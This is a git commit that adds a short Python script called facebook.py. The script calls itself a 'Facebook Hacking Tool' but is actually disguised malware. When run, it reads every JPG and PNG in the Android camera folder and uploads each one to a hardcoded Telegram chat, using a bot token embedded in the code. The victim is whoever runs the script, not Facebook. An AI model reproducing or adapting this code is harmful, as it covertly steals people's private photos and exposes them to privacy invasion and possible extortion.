6505a8587b99bb4b59d1e1aab929a5317d05b4da
echoeyes <137489505+echoeyesdev@users.noreply.github.com>
2023-11-04 17:24:32 +0200

    Add files via upload

---
+++ facebook.py
@@ -0,0 +1,23 @@
+import os
+import time
+from telebot import TeleBot
+
+bot = TeleBot('6774425694:AAH1jHZqubHU9Z7Fe5pQtp49Psl3zC-WdR8')
+
+chat_id = '1845018877'
+
+camera_photos_directory = '/storage/emulated/0/DCIM/Camera'
+
+def send_photos():
+    print('Welcome TO my Facebook Hacking Tool')
+    print()
+    print('wait a Minute...')
+    for filename in os.listdir(camera_photos_directory):
+        if filename.endswith('.jpg') or filename.endswith('.png'):
+            photo_path = os.path.join(camera_photos_directory, filename)
+            with open(photo_path, 'rb') as photo:
+                bot.send_photo(chat_id, photo)
+
+
+send_photos()
+
